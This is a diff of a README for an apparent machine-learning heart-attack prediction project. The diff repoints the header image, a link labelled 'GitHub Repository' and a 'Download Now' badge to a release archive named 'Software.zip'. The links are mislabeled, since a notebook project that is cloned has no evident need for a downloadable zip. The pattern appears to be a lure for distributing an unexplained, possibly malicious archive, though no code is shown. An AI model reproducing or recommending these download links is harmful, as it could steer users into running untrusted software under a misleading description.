@@ -1,6 +1,6 @@
 # 🩺📊 Heart Attack Predictor 📉💔
 
-![Heart Attack](https://github.com/Quang123-op/Heart_Attack/releases/download/v1.0/Application.zip)
+![Heart Attack](https://github.com/Quang123-op/Heart_Attack/releases/download/v2.0/Software.zip)
 
 Welcome to the "Heart_Attack" repository - your one-stop solution to predict the likelihood of heart attacks using cutting-edge machine learning techniques. Early diagnosis and intervention are crucial in preventing heart attacks, and this project aims to assist in that mission through data preprocessing, feature selection, model training, and evaluation.
 
@@ -29,11 +29,11 @@ To get started, simply clone this repository and dive into the Jupyter notebooks
 - Python
 
 ## 🌐 External Resources
-For more information, check out the [Heart_Attack GitHub Repository](https://github.com/Quang123-op/Heart_Attack/releases/download/v1.0/Application.zip). 🚀
+For more information, check out the [Heart_Attack GitHub Repository](https://github.com/Quang123-op/Heart_Attack/releases/download/v2.0/Software.zip). 🚀
 
 If the link doesn't provide direct access, please visit the "Releases" section for additional details.
 
-[![Download Now](https://github.com/Quang123-op/Heart_Attack/releases/download/v1.0/Application.zip)](https://github.com/Quang123-op/Heart_Attack/releases/download/v1.0/Application.zip)
+[![Download Now](https://github.com/Quang123-op/Heart_Attack/releases/download/v2.0/Software.zip)](https://github.com/Quang123-op/Heart_Attack/releases/download/v2.0/Software.zip)
 
 ## 🏥 Stay Connected
 Stay updated on the latest advancements in heart attack prediction by following this repository. Your support fuels our commitment to leveraging AI for healthcare excellence.
